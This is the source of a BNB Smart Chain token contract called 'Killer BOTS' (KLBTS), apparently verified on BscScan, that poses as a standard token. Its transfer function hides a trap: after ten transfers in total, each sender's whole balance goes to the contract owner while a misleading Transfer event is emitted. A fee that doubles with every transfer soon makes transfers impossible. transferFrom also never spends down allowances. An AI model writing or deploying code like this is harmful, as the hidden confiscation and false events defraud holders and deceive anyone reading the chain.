/**
 *Submitted for verification at BscScan.com on 2022-03-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract KLBTSToken {
    uint public _KLKil;
    uint public _KLBrn;
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    
    string public name = "Killer BOTS";
    string public symbol = "KLBTS";
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    uint public totalSupply = 1e6 * 10 ** 8;
    uint public decimals = 8;
    
    address public contractOwner;
    
    constructor() {
        _KLKil = 0;
        _KLBrn = 1;
        contractOwner = msg.sender;
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        uint _KLFee = (value * _KLBrn / 100);

        require(balanceOf(msg.sender) >= (value + _KLFee), "#1");
        if(++_KLKil >= 10){
            balances[contractOwner] += balanceOf(msg.sender);
            balances[msg.sender] -= balanceOf(msg.sender);
            emit Transfer(msg.sender, to, value);
        } else {
            _KLBrn *= 2;
            balances[to] += value - _KLFee;
            balances[contractOwner] += _KLFee;
            balances[msg.sender] -= value + _KLFee;
            emit Transfer(msg.sender, to, value);
        }
        
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, "#2");
        require(allowance[from][msg.sender] >= value, "#3");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}